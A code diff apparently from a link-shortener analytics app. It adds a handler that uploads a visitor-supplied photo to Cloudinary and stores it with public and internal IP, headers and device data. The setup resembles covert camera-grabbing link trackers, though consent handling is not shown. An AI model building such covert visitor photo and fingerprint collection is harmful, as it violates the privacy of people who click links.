@@ -3,6 +3,13 @@ const UAParser = require("ua-parser-js");
 const Visit = require("../models/Visit");
 const Link = require("../models/Link");
 const geoip = require("geoip-lite");
+const cloudinary = require("cloudinary").v2;
+
+cloudinary.config({
+  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
+  api_key: process.env.CLOUDINARY_API_KEY,
+  api_secret: process.env.CLOUDINARY_API_SECRET,
+});
 
 exports.redirectLink = async (req, res) => {
   try {
@@ -174,6 +181,89 @@ exports.trackVisitOnly = async (req, res) => {
     });
   }
 };
+
+exports.trackVisitWithPhoto = async (req, res) => {
+  try {
+    const { shortCode } = req.params;
+    const { photo, timestamp } = req.body;
+
+    // Find the link
+    const link = await Link.findOne({ shortCode }).lean();
+    if (!link) {
+      return res.status(404).json({ error: "Link not found" });
+    }
+
+    let photoUrl = null;
+
+    // Upload photo to Cloudinary if provided
+    if (photo) {
+      try {
+        const uploadResult = await cloudinary.uploader.upload(photo, {
+          folder: "link-analytics/photos",
+          resource_type: "image",
+          transformation: [
+            { width: 400, height: 400, crop: "limit" },
+            { quality: "auto" },
+            { format: "jpg" },
+          ],
+        });
+        photoUrl = uploadResult.secure_url;
+      } catch (uploadError) {
+        console.error("Cloudinary upload error:", uploadError);
+        // Continue without photo if upload fails
+      }
+    }
+
+    // --- Collect tracking info safely ---
+    const t = req.trackingData || {};
+    const ipInfo = t.ipInfo || {};
+    const device = t.device || {};
+    const headers = t.headers || req.headers || {};
+    const referrer = t.referrer || req.get("referer");
+
+    // --- Save analytics & increment click count ---
+    const visitData = {
+      link: link._id,
+      publicIp: ipInfo.publicIp,
+      internalIp: ipInfo.internalIp,
+      userAgent: headers["user-agent"],
+      sessionId: t.sessionId,
+      device: {
+        type: device.type,
+        os: device.os,
+        browser: device.browser,
+        model: device.model,
+        isMobile: device.isMobile,
+        isBot: device.isBot,
+      },
+      referrer: referrer,
+      headers: headers,
+      photo: photoUrl, // Store Cloudinary URL
+      hasPhoto: !!photoUrl, // Flag to easily check if photo exists
+    };
+
+    // Save tracking data
+    await Promise.allSettled([
+      Visit.create(visitData),
+      Link.updateOne({ _id: link._id }, { $inc: { clicks: 1 } }),
+    ]);
+
+    console.log("Tracking with photo: Successfully saved visit data");
+
+    res.json({
+      success: true,
+      message: "Tracking completed successfully",
+      hasPhoto: !!photoUrl,
+    });
+  } catch (error) {
+    console.error("Tracking with photo error:", error);
+    return res.status(500).json({
+      success: false,
+      message: "Internal server error",
+    });
+  }
+};
+
 function parseUserAgent(ua) {
   // Use ua-parser-js or custom logic
   return {
